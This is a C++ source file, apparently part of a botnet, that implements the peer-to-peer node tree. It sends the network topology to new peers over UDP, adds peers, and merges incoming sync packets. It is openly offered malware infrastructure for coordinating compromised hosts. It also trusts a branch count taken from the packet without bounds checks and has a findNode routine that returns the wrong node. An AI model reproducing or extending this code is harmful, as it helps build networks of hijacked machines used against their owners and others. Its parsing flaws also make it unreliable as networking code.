#include "botnet.h"

BotnetNode::BotnetNode()
	:_adr({ 0,0 })
{
}

BotnetNode::BotnetNode(
	uint32_t ip, 
	uint16_t port
)
	:_adr({ ip, port })
{
}


void BotnetNode::sendNetTree(
	const SOCKET& udp_sock,
	const struct sockaddr_in& peer_addr,
	std::vector<adr>& hosts,
	char* const buf
)
{
	if (std::find_if(hosts.begin(), hosts.end(), [=](auto host) {return host.ip == _adr.ip && host.port == _adr.port; }) != hosts.end())
		return;

	/* init and set pointers */
	memset(buf, 0, 1024);
	struct botnet_pack* default_pack = (struct botnet_pack*)buf;
	tree_ext* extention = (tree_ext*)(buf + BOTNET_PACK_SIZE);
	u_char* branches_data = (u_char*)(buf + BOTNET_PACK_SIZE + sizeof(tree_ext));

	/* fill the packet with data*/
	default_pack->type = NETWORK_SYNC;
	extention->host = _adr;
	extention->n_branches = _branches.size();
	for (BotnetNode* node : _branches)
	{
		memcpy(branches_data, &node->_adr, sizeof(adr));
		branches_data += sizeof(adr);
	}

	/* send the packet */
	sendto(udp_sock, buf, 1024, 0, (struct sockaddr*)&peer_addr, sizeof(peer_addr));

	/* add the host to prevent infinite recursion */
	hosts.push_back(_adr);

	/* iterate over next branches */
	for (BotnetNode* node : _branches)
		node->sendNetTree(udp_sock, peer_addr, hosts, buf);
}

void BotnetNode::addPeer(
	const struct botnet_pack& pack, 
	const SOCKET& udp_sock
)
{
	/* locals */
	char buffer[1024];
	std::vector<adr> hosts;
	struct sockaddr_in peer_addr;

	/* create sockaddr_in struct */
	peer_addr.sin_family = AF_INET;
	peer_addr.sin_port = htons(pack.dst_peer.port);
	peer_addr.sin_addr.s_addr = htonl(pack.dst_peer.ip);

	sendNetTree(udp_sock, peer_addr, hosts, buffer);

	_branches.push_back(new BotnetNode(pack.dst_peer.ip, pack.dst_peer.port));
}

BotnetNode* BotnetNode::findNode(
	const adr& addr,
	std::vector<adr>& hosts
)
{
	if (std::find_if(hosts.begin(), hosts.end(), [=](auto host) {return host.ip == _adr.ip && host.port == _adr.port; }) != hosts.end())
		return nullptr;

	hosts.push_back(_adr);

	if (_adr.ip == addr.ip && _adr.port == addr.port)
		return this;

	for (BotnetNode* node : _branches)
		if (node->findNode(addr, hosts))
			return node;

	return nullptr;
}

void BotnetNode::handleSync(
	const struct botnet_pack& pack
)
{
	/* locals */
	BotnetNode* base_node, *sub_node;
	std::vector<adr> peers_nodes, temp_nodes;
	tree_ext* base; 
	adr* peer; (adr*)((u_char*)base + sizeof(tree_ext));

	base = (tree_ext*)((u_char*)&pack + BOTNET_PACK_SIZE);
	peer = (adr*)((u_char*)base + sizeof(tree_ext));

	/* add all host's sub peers to a list */
	peers_nodes.clear();
	for (size_t i = 0; i < base->n_branches; i++)
	{
		peers_nodes.push_back(*peer);
		peer++;
	}
	
	/* check if node already exists in tree */
	base_node = findNode(base->host, temp_nodes);

	if (base_node)
		for (adr addr : peers_nodes)
		{
			temp_nodes.clear();
			sub_node = findNode(addr, temp_nodes);
			
			if (!sub_node)
				base_node->_branches.push_back(new BotnetNode(addr.ip, addr.port));
		}
}
